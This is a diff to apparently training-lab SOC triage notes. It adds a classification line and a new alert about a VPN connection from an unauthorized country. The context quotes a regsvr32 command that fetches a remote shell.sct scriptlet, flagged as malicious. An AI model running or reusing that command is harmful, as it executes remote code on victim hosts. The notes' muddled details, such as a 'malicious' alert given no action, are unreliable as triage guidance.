@@ -96,10 +96,35 @@ OR
 -The hash address from which it was send was found to be malicious and belonged to contained mail.rtf . Attackers have historically used RTF documents to deliver or trigger malicious content. 
 -The given command "regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll" was found suspicious and an indicator of regsvr32.exe abuse . 
 
+**Classification:** True Positive - Malicious  
+
 **Action taken:** We have contained the action for further assessment and deleted the email from the host mail.
 
 **Time of triage:** 20mins 
 
+
+**Alert #5**
+
+**Date:** 2024-02-13  2:04:00 AM
+
+**Severity:** Low
+
+**Source IP:** 113.161.158.12 
+
+**Target:** Monica (monica@letsdefend.io)
+
+**Hypothesis:**  VPN Connection Detected from Unauthorized Country
+
+**Evidence:** On 2024-02-13  2:04:00  AM our host "Monica" ip address "172.16.17.163 " received an "VPN Connection Detected from Unauthorized Country" alert . 
+-The alert source address was "113.161.158.12" which belonged to  "VNPT Corporation" , Vietnam and is shown malicious when tested .
+-The destination address "33.33.33.33" to which the attacker is trying to connect is claimed to be malicious as well and belongs to "United States Department of Defense (DoD)" , US . 
+-We didnt find anything that would cause a big problem and there were no data loss as well
+
+**Classification:** True positive - Malicious 
+
+**Action Taken:** -Nothing since it is not a big issue 
+
+**Time to triage:** 15mins 
 
 
 
